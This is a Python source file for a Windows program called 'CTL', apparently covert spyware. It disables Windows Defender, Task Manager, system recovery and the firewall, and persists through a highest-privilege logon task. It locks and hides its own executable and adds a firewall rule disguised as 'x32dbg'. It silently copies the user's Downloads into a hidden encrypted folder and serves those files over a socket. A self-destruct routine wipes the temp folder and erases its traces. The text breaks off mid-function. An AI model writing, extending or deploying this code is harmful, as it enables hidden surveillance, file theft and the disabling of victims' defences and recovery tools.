










# import tools
# from tools import *
import os
import shutil
import time
import hashlib
import sys
import socket
import threading
import string
import random
import xml.etree.ElementTree as ET
import winreg
from concurrent.futures import ThreadPoolExecutor
import ctypes
import win32comext.shell.shell as shell
import subprocess
from Crypto.Cipher import AES
import psutil
import win32api
import requests
# replica of a version of VAry

# Note this tool IS DIFFERENT THAN VARY, it is NOT a remote hosting server to run tasks, rather, it does as it presents, w/ hidden and hidding features.

# also perhaps per each boot it'll secure delete the temp folder? and then restart it's own script in case of corruption - in any case it delets a part of it's own data in temp folder - and move to diff folders..
# the way it'll know what it moved and what it didn't is via checking the file names with an addition of .encrypted as the end. note, IT SHOULD NOT REPLACE THE PREVIOUS EXTENSION, RATHER, IT WILL APPEND A .encrypted TO THE END OF THE FILE NAME.

# if task manager / other items are enabled in registry, then you uninstall the program and remove the traces.. atm idk about removing the backup files

INTERNET = False  
CHECK_INTERVAL = 1  
TIMEOUT_THRESHOLD = 5 
# NOTE: nuitka  --follow-imports --onefile CTL.py
WATCH_DIR = os.path.expanduser("~/Downloads") # Directory to monitor
BACKUP_DIR = os.path.expanduser("~/.backup") # Hidden backup directory
MAX_FILE_SIZE = 50 * 1024 * 1024 # 50MB
HOST_PORT = 58963  # Choose a unique port
COPY_TIMEOUT = 10  # Timeout for file copy in seconds
SEND_TIMEOUT = 600000  # Timeout for sending a file
lastconnection = 0

def slp(seconds):
    """Sleeps without using time.sleep(), preventing thread blocking.

    Args:
        seconds (int): The number of seconds to wait.
    """
    
    toWait = time.time() + seconds
    while time.time() < toWait:
        pass


class KThread(threading.Thread):
    """A subclass of threading.Thread, with a kill()
method."""
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run            # Force the Thread to
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True
 
 
 
def get_script_directory():
    """Gets the directory where the script or executable is located."""
    return "C:\ProgramData"#os.getcwd() # with confirmations, this is the correct way to get the directory of the script or executable, regardless of whether it's running as a script, frozen executable, or bundled executable.
    
    # return os.path.dirname[sys.argv[0]]
    # else: 
        # if getattr(sys, 'frozen', False):
        #     # Running as a bundled executable
        #     return os.path.dirname(sys.executable)
        # else:
        #     # Running as a normal Python script
        #     return os.path.dirname(os.path.abspath(__file__))

# print(f'Paths:')
# print(f'os.getcwd: {os.getcwd()}')
# print(f'sys.executable: {os.path.dirname(sys.executable)}')
# print(f'abspath: {os.path.dirname(os.path.abspath(__file__))}')
# print(f'Filename: {os.path.basename(sys.argv[0])}')

def is_nuitka() -> bool:
    """
    Check if the script is compiled with Nuitka.
    """
    is_nuitka = "__compiled__" in globals()
    is_nuitka2 = "NUITKA_ONEFILE_PARENT" in os.environ
    return is_nuitka or is_nuitka2
 

def get_script_filename():
    """Gets the filename of the script or executable."""
    return os.path.basename(sys.argv[0])
    # else:
    #     if getattr(sys, 'frozen', False):
    #         # Running as a bundled executable
    #         return os.path.basename(sys.executable)
    #     else:
    #         # Running as a normal Python script
    #         return os.path.basename(__file__)



print(f"Script is running from {get_script_directory()} with a filename of: {get_script_filename()}")

def get_process_connected_pids(pid):
    """Gets a list of PIDs related to a given process, including parent and children."""
    proc = psutil.Process(pid)
    parent = proc.parent()
    ppid = parent.pid if parent is not None else None
    children = proc.children()
    child_pids = [child.pid for child in children]
    all_pids = [pid]
    if ppid is not None:
        all_pids.append(ppid)
    all_pids.extend(child_pids)
    return all_pids


def add_firewall_rule(name, port, protocol="TCP"):
    """Adds a firewall rule to allow incoming connections on the specified port."""
    script_path = os.path.join(get_script_directory(), get_script_filename())
    cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol={protocol} localport={port} program="{script_path}" enable=yes'
    run_command_as_admin(cmd)
    
def get_username_os():
    """Gets the username of the current user."""
    return os.getlogin()

def DisableWindowsDefender():
    """Disables various components of Windows Defender."""
    try: 
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        run_command_as_admin('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v ForceUpdateFromMU /t REG_DWORD /d 0 /f')
        run_command_as_admin('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f')
    except Exception as e: 
        print(e)
        return False
    
def EnableWindowsDefender():
    """Enables various components of Windows Defender."""
    try: 
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
    except Exception as e: 
        print(e)
        return False

def runcmd(cmd, suppress=False, retry=0):
    """Runs a command in the shell.

    Args:
        cmd (str): The command to run.
        suppress (bool): Whether to suppress output. Defaults to False.
        retry (int): Number of retries. Defaults to 0.

    Returns:
        None
    """
    try:
        a = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        a.wait()
        if a.returncode == 0:
            if not suppress:
                print("The command ran successfully", "@ command :", cmd)
        else:
            if not suppress:
                print("The command failed with return code", a.returncode, "@ command :", cmd)
            if retry > 4:
                return
            retry += 1
            runcmd(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at runcmd, {e}')

def kill_self():
    """Kills the script and all its related processes."""
    [runcmd(f'taskkill /f /t /PID {i}') for i in get_process_connected_pids(os.getppid())]
    runcmd(f'taskkill /f /t /PID {os.getpid()}')
    exit()
    sys.exit(0)
    

if get_username_os() == "main":
    print("Building script")
    print(f"Run:\ncd host\nnuitka --onefile --remove-output --standalone --windows-disable-console CTL.py\nnuitka --standalone --follow-imports --onefile CTL.py")
    # nuitka --standalone --follow-imports --onefile CTL.py                                                                                                                                                                               
    print('nuitka works but need to run more tests. e.g. self destruction')
    # os.system("pyinstaller --onefile --console --distpath C:\\Users\placeholder\\dist C:\\Users\placeholder\\CTL.py")
    time.sleep(5)
    kill_self()
    exit()

print("Starting CTL...")
admin_privileges = not (ctypes.windll.shell32.IsUserAnAdmin() == 0)

 


def run_command_as_admin(cmd, suppress=False, retry=0):
    """Runs a command with administrator privileges.

    Args:
        cmd (str): The command to run.
        suppress (bool): Whether to suppress output. Defaults to False.
        retry (int): Number of retries. Defaults to 0.

    Returns:
        None
    """
    try:
        a = shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+cmd)
        if a['hInstApp'] > 32:
            if not suppress:
                print("The admin command ran successfully", "@ command :", cmd)
        else:
            if not suppress:
                print("The admin command failed with an error code", ctypes.WinError(), "@ command :", cmd)
            if retry > 4:
                return
            retry += 1
            return run_command_as_admin(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at run_command_as_admin, {e}, CMD:{cmd}')
        if 'The operation was canceled by the user.' in e.args:
            retry +=1
            return run_command_as_admin(cmd, suppress, retry)
        
key_for_encryption_of_backup = 'bananas'


def disableTaskmanager():
    """Disables the Windows Task Manager."""
    run_command_as_admin('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

def addselftostartup_reg():
    """Adds the script to the Windows registry to run on startup (requires admin rights)."""
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    try:
        os.rmdir(startup_folder)
    except:
        pass
    run_command_as_admin(f'schtasks /create /sc ONLOGON /tn "vtl" /tr "{os.path.join(get_script_directory(), get_script_filename())}" /ru {os.getlogin()} /rl HIGHEST /it /f')


def enabletaskmgr():
    """Enables the Windows Task Manager."""
    run_command_as_admin('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')

def self_tostartup():
    addselftostartup_reg()
 


def bypassfirewall():
    """Bypasses the firewall for the script."""
    exe_path = os.path.join(get_script_directory(), get_script_filename())
    cmd = f'netsh advfirewall firewall add rule name="x32dbg" dir=in action=allow program="{exe_path}" enable=yes'
    
    run_command_as_admin(cmd)


def protect_file(file_path):
    """Protects a file by setting permissions and attributes.

    Args:
        file_path (str): The path to the file to protect.
    """
    run_command_as_admin(f'icacls "{file_path}" /inheritance:r /grant:r {os.environ["username"]}:F /deny "*":RX')
    run_command_as_admin(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    run_command_as_admin(f'icacls "{file_path}" /deny {os.getlogin()}:W,D')
    run_command_as_admin(f'attrib +r +h +s "{file_path}"')
    run_command_as_admin(f'attrib +r "{file_path}"')
    run_command_as_admin(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    run_command_as_admin(f'icacls "{file_path}" /disable')


def disableresetoptions():
    """Disables various system reset options in Windows."""
    run_command_as_admin('reagentc.exe /disable')
    run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 1 /f')
    run_command_as_admin(r'bcdedit /set {default} recoveryenabled no')
    run_command_as_admin(r'bcdedit /set {default} bootmenupolicy legacy')
    run_command_as_admin('takeown /f ReAgentc.exe')
    run_command_as_admin('icacls "C:\\Windows\\system32\\ReAgentc.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im ReAgentc.exe')
    slp(0.5)
    run_command_as_admin('ren "C:\\Windows\\system32\\ReAgentc.exe" tmpreagentc.exe')
    
def enableresetoptions():
    """Enables various system reset options in Windows."""
    run_command_as_admin('reagentc.exe /enable')
    run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 0 /f')
    run_command_as_admin(r'bcdedit /set {default} recoveryenabled yes')
    run_command_as_admin('takeown /f tmpreagentc.exe')
    run_command_as_admin('icacls "C:\\Windows\\system32\\tmpreagentc.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im tmpreagentc.exe')
    slp(0.5)
    run_command_as_admin('ren "C:\\Windows\\system32\\tmpreagentc.exe" ReAgentc.exe')
    
def restart_self():
    """Restarts the script."""
    def start_offset():
        run_command_as_admin(f'  start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
    a = threading.Thread(target=start_offset)
    a.start()
    time.sleep(1)
    kill_self()
    exit()
    sys.exit(0)
    # runcmd('taskkill /f /im cmd.exe', retry=3) 
    
def disablefirewall():
    """Disables the Windows Firewall."""
    runcmd('netsh advfirewall set allprofiles state off', True)
    runcmd('netsh firewall set notifications mode=disable profile=all', True)

if len(sys.argv) > 1: 
    if sys.argv[1].lower() == "initialize" or sys.argv[1].lower() == "ini": 
        if not admin_privileges:
            # restart self with initlize as a arg
            run_command_as_admin(f"start {os.path.join(get_script_directory(), get_script_filename())} initialize")
            kill_self()
            
        DisableWindowsDefender()
        self_tostartup()
        disableresetoptions()
        disableTaskmanager()
        protect_file(os.path.join(get_script_directory(), get_script_filename()))
        try:    
            add_firewall_rule("CTL", HOST_PORT)
        except: pass
        bypassfirewall() # it restarts the machine in this function, so there is a second restart self just in case it misses
        run_command_as_admin('shutdown.exe /g /t 2')
        restart_self()
        exit()
        


def checktaskmgr():
    try:
        # Open the registry key
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ)
        
        # Query the value of DisableTaskMgr
        value, reg_type = winreg.QueryValueEx(registry_key, "DisableTaskMgr")
        
        # Close the registry key after use
        winreg.CloseKey(registry_key)
        
        # Return the value
        return value
    except FileNotFoundError:
        print("taskmgr key or value not found. defaulting to it not being blocked")
        return 0


def secure_delete_file(file_path, passes=3):
    """Securely delete a single file by overwriting it with random data."""
    try:
        file_size = os.path.getsize(file_path)
        with open(file_path, 'r+b') as file:
            for _ in range(passes):
                file.seek(0)
                file.write(os.urandom(file_size))
                file.flush()
        # os.remove(file_path)
        run_command_as_admin(f'del "{file_path}"')
    except Exception as e:
        pass
        # print(f"Error deleting file {file_path}: {e}")
def secure_delete_directory(directory_path, passes=3):
    """
    Deletes directories and files within a given directory, 
    with a focus on those starting with '_' for potential 
    pyinstaller packaged application cleanup, without using shutil.
    """

    def deletion(root, dirs, files):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                secure_delete_file(file_path, passes) 
            except Exception:
                pass

        # Delete directories in reverse order to handle nested directories
        for dir in reversed(dirs):
            dir_path = os.path.join(root, dir)
            if dir.startswith("onefile"):
                try:
                    delete_directory_recursively(dir_path)
                except Exception:
                    pass
            else:
                try:
                    run_command_as_admin(f'rd /s /q "{dir_path}"') # delete (dir_path) 
                except OSError:
                    pass

    def delete_directory_recursively(dir_path):
        for root, dirs, files in os.walk(dir_path, topdown=False):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    secure_delete_file(file_path, passes)
                except Exception:
                    pass
            for dir in dirs:
                dir_path_inner = os.path.join(root, dir)
                try:
                    run_command_as_admin(f'rd /s /q "{dir_path_inner}"') # delete(dir_path_inner)
                except Exception:
                    pass
        try:
            run_command_as_admin(f'rd /s /q "{dir_path}"') # os.rmdir(dir_path)
        except Exception:
            pass

    with ThreadPoolExecutor() as executor:
        for root, dirs, files in os.walk(directory_path):
            executor.submit(deletion, root, dirs, files)



def remove_firewall_rule(name):
    """Removes a firewall rule."""
    cmd = f'netsh advfirewall firewall delete rule name="{name}"'
    run_command_as_admin(cmd)


def enablefirewall():
    """Enables the Windows Firewall."""
    runcmd('netsh advfirewall set allprofiles state on', True)
    

def enableUserAccountControl():
    """Enables User Account Control (UAC) in Windows."""
    run_command_as_admin('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f')      



def revert_changes():
    """Reverts the changes made by the script."""
    enableresetoptions()
    enabletaskmgr()
    unprotect_file(os.path.join(get_script_directory(), get_script_filename()))
    run_command_as_admin('schtasks /delete /tn "vtl" /f') # deletes task scheduler
    try:
        remove_firewall_rule('CTL')
    except:
        pass
    # delete x32dbg
    try: run_command_as_admin('netsh advfirewall firewall delete rule name="x32dbg"')
    except: pass
    enableUserAccountControl()
    enablefirewall()
    remove_self_from_startup()
 
    EnableWindowsDefender()

def remove_self_from_startup():
    """Removes the script from startup."""
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    script_filename = get_script_filename()
    startup_path = os.path.join(startup_folder, script_filename)
    try:
        os.remove(startup_path)
        print("Removed from startup folder:", startup_path)
    except FileNotFoundError:
        print("Script not found in startup folder:", startup_path)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, 'vtl') 
        winreg.CloseKey(key)
        print("Removed from registry.")
    except FileNotFoundError:
        print("Script not found in registry.")

def remove_self_from_safe_mode():
    """Removes the script from Safe Mode."""
    registry_paths = [
        r"HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network"
    ]
    for path in registry_paths:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, "robocopy.exe")
            winreg.CloseKey(key)
            print(f"Removed from safe mode registry: {path}")
        except FileNotFoundError:
            print(f"Script not found in safe mode registry: {path}")

def unprotect_file(file_path):
    """Removes protection from a file."""
    run_command_as_admin(f'attrib -r -h -s "{file_path}"')
    run_command_as_admin(f'icacls "{file_path}" /grant everyone:RX')
    run_command_as_admin(f'takeown /f "{file_path}"')
    run_command_as_admin(f'icacls "{file_path}" /grant Everyone:(OI)(CI)F ')
    # Re-enable inheritance and remove specific permissions
    run_command_as_admin(f'icacls "{file_path}" /inheritance:e')
    # Remove read-only, hidden, and system attributes
    run_command_as_admin(f'attrib -r -h -s "{file_path}"')
    # Reset permissions to default (you may need to adjust this based on your system's defaults)
    run_command_as_admin(f'icacls "{file_path}" /reset')    
    # Enable inheritance and grant full control to the current user
    run_command_as_admin(f'icacls "{file_path}" /inheritance:e /grant:r {os.environ["username"]}:F')

def screenoff():
    """Turns off the screen."""
    win32api.SendMessage(0xFFFF, 0x0112, 0xF170, 2) 

def take_ownership(path):
    """Take ownership of the specified file or directory."""
    try:
        # Use the takeown command to take ownership of the directory or file
        os.system(f'takeown /f "{path}"')
        os.system(f'icacls "{path}" /grant {os.getlogin()}:F /t')
    except Exception as e:
        # print(f"Error taking ownership of {path}: {e}")
        pass
def self_destruct():
    global monitoring_thread
    try:
        monitoring_thread.kill()
    except Exception as e: print('Couldnt kill monitering thread, but thats fine\nReason: ', e)
    """Deletes the script file and reverts all changes."""
    revert_changes()
    try:
        # take ownership of the temp dir
        take_ownership(os.path.expandvars(r'%TEMP%').casefold())
        print("Finished taking ownership of given space")
    except: pass
    try:
        secure_delete_directory(os.path.expandvars(r'%TEMP%').casefold())
        print("Deleting has finished..")    
    except: pass
    script_path = os.path.join(get_script_directory(), get_script_filename())
    random_string_cmd = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    random_task_name = "SelfDestruct_" + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    cmd_content = f"""
@echo off
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 2 > nul
del /f /q "{script_path}"
ping 127.0.0.1 -n 2 > nul
del /f /q "{script_path}"
schtasks /delete /tn "{random_task_name}" /f
ping 127.0.0.1 -n 2 > nul
del /f /q "%~f0"
    """
    cmd_path = os.path.join(get_script_directory(), random_string_cmd)
    with open(cmd_path, "w") as cmd_file:
        cmd_file.write(cmd_content)
    user_name = os.getlogin()
    create_task_command = f'schtasks /create /tn "{random_task_name}" /tr "{cmd_path}" /sc ONCE /st 00:00 /f /rl HIGHEST /ru {user_name}'
    run_task_command = f'schtasks /run /tn "{random_task_name}"'
    asd = threading.Thread(target=screenoff)
    asd.start()
    
    
    run_command_as_admin(create_task_command)
    run_command_as_admin(run_task_command)

    # Pass the PID and script path to the batch script as arguments
    deletion_script_path = os.path.join(get_script_directory(), random_string_cmd) 
    run_command_as_admin(f'start cmd /c "{deletion_script_path}" {os.getpid()} "{script_path}"') 

    time.sleep(1)  # Give cmd some time to start
    kill_self()  # Now kill the Python scriptkill_self()
    
    
isdisabledtaskmgr = checktaskmgr() # disabletaskmgr? 0 == False don't disable, 1 = disable it

print('is taskmgr disabled? ', isdisabledtaskmgr)
print(f"{isdisabledtaskmgr == 0} or it as it is currently: {isdisabledtaskmgr=='0'}")
if not os.path.isfile(os.path.join(get_script_directory(), get_script_filename())):
    print('Skipping taskmanager check')
    pass # since if it isn't in the correct location and the next check of this shall take place and take action instead of this. both will self destruct so whatever
else:
    if isdisabledtaskmgr == 0 or isdisabledtaskmgr == '0':
        fail_file_path = os.path.join(os.path.expanduser("~"), "Documents", "fail.txt")
        try: open(fail_file_path, "w")
        except Exception as e: print('Error when creating failsafe file: ' + str(e))
        self_destruct() # this will delete the program and all traces of it, and then restart the machine

# secure delete temp folder cause it sometimes gets big, and then restart self
# make this be 1/3 of a chance of happening
if random.randint(1, 3) == 3:
    print('1/3 Chance, Cleaning temp folder from remnants of runtimes')
    try:
        # take ownership of the temp dir
        take_ownership(os.path.expandvars(r'%TEMP%').casefold())
        print("Finished taking ownership of given space")
    except Exception as e:
        print('1/3 Cleanup: Error when taking ownership of temp folder: ' + str(e))
        pass
    try:
        secure_delete_directory(os.path.expandvars(r'%TEMP%').casefold())
        print("Deleting has finished..")    
        restart_self() 
        exit()
    except Exception as e:
        print('1/3 Cleanup: Error when cleaning temp folder: ' + str(e))
        pass
    restart_self()
    exit()

    
def send_file(conn, filename):
    """Sends a file with error handling and status codes."""
    filepath = os.path.join(BACKUP_DIR, filename)

    if not os.path.exists(filepath):
        conn.sendall("FILE_NOT_FOUND".encode())
        return

    try:
        with open(filepath, 'rb') as f:
            file_data = f.read()
            conn.sendall(len(file_data).to_bytes(4, 'big'))  # Send file size
            conn.sendall(file_data)
        os.remove(filepath) # Delete after successful send
        conn.recv(1024) # Wait for client to confirm receipt. Handles potential errors

    except Exception as e:
        print(f"Error sending {filename}: {e}")
        conn.sendall("SEND_ERROR".encode())

 
def clear_downloads():
    for filename in os.listdir(WATCH_DIR):
        filepath = os.path.join(WATCH_DIR, filename)
        if os.path.isfile(filepath):
            try:
                os.remove(filepath)
                print(f"Deleted from Downloads: {filename}")
            except Exception as e:
                print(f"Error deleting {filename}: {e}")

# Create backup directory if it doesn't exist
if not os.path.exists(BACKUP_DIR):
    os.makedirs(BACKUP_DIR)



def encrypt_msg(msg, key=b'placeholder'): # Expects either str or bytes
    """Encrypts a message using AES."""

    def encrypt(key, plaintext_bytes): # Expects bytes
        """Encrypts the plaintext using AES."""
        try:
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext_bytes)
            return (cipher.nonce, tag, ciphertext)
        except Exception as e:
            print(f'Error during encryption: {e}')
            return None

    try:
        if isinstance(msg, str):
            msg_bytes = msg.encode('utf-8')  # Encode only if it's a string
        elif isinstance(msg, bytes):
            msg_bytes = msg # Already bytes, do nothing
        else:
            raise TypeError("msg must be string or bytes")

        encrypted_data = encrypt(key, msg_bytes)
        if encrypted_data:
            return str(encrypted_data).encode('utf-8')  # Encode the tuple representation
        else:
            return False  # Encryption failed
    except Exception as e:
        print(f'Error during encryption process: {e}')
        return False
    
def secure_copy(src, dst):
    """Copies and encrypts the file, handling encryption errors."""
    try:
        with open(src, 'rb') as f_in:
            file_data = f_in.read()

        encrypted_data = encrypt_msg(file_data, key_for_encryption_of_backup)
        if encrypted_data == False: # check if encryption failed, and exit if it did
             print(f"Encryption error for {src}. Make sure the encrypt_msg() function returns bytes")
             return False # indicate failure

        with open(dst, 'wb') as f_out:
            f_out.write(encrypted_data)
        print(f"Copied and encrypted: {src} to {dst}")
        return True

    except Exception as e:
        print(f"Error during secure copy of {src}: {e}")
        return False


def copy_to_backup(filename):
     """Copies a file to the backup directory with encryption."""
     filepath = os.path.join(WATCH_DIR, filename)
     backup_path = os.path.join(BACKUP_DIR, filename + ".encrypted")

     if secure_copy(filepath, backup_path): # checks if copied and encrypted successfully
         print(f"Copied to backup: {filename}")
         return True
     else:
         print(f"Failed to copy or encrypt {filename} to backup") # include explicit message in case of failure.
         return False # propagate failure
     
     
last_successful_check = 0

def check_internet():
    global INTERNET, last_successful_check
    sites_to_check = [
        "https://www.google.com",
        "https://www.cloudflare.com",
        "https://www.amazon.com"
    ]
    
    for site in sites_to_check:
        try:
            response = requests.get(site, timeout=2)
            if response.status_code == 200:
                INTERNET = True
                last_successful_check = time.time()
                # print(f'Internet connection detected (connected to {site})')
                return
        except requests.RequestException:
            continue
    
    # If we've reached this point, all checks failed
    if time.time() - last_successful_check > TIMEOUT_THRESHOLD:
        INTERNET = False
        print("Internet connection lost")

def internet_check_loop():
    while True:
        check_internet()
        time.sleep(CHECK_INTERVAL)


def start_internet_check():
    threading.Thread(target=internet_check_loop, daemon=True).start()

start_internet_check()

def monitor_directory():
    """Continuously monitors for new files and copies them to the backup using threads."""
    
    while True:
        try:
            time.sleep(5)
            current_files = set(os.listdir(WATCH_DIR))
            backup_files_renamed = {f.removesuffix(".encrypted") for f in os.listdir(BACKUP_DIR) if f.endswith(".encrypted")}
            files_to_copy = current_files - backup_files_renamed  # Files present in Downloads but not backed up
            print(f"Backup files: {backup_files_renamed}")
            print(f'Backup dir files untouched {[i for i in os.listdir(BACKUP_DIR)]}')
            print(f"Current files: {current_files}")
            print(f"Files to copy: {files_to_copy}")
            copy_threads = []
            for filename in files_to_copy: # Iterate through the files that need to be copied
                filepath = os.path.join(WATCH_DIR, filename)
                if os.path.isfile(filepath) and os.path.getsize(filepath) <= MAX_FILE_SIZE:
                    t = threading.Thread(target=copy_to_backup, args=(filename,))
                    copy_threads.append(t)
                    t.start()

            for t in copy_threads:  # Wait for all copy threads to finish without timeout
                t.join()


        except Exception as e:
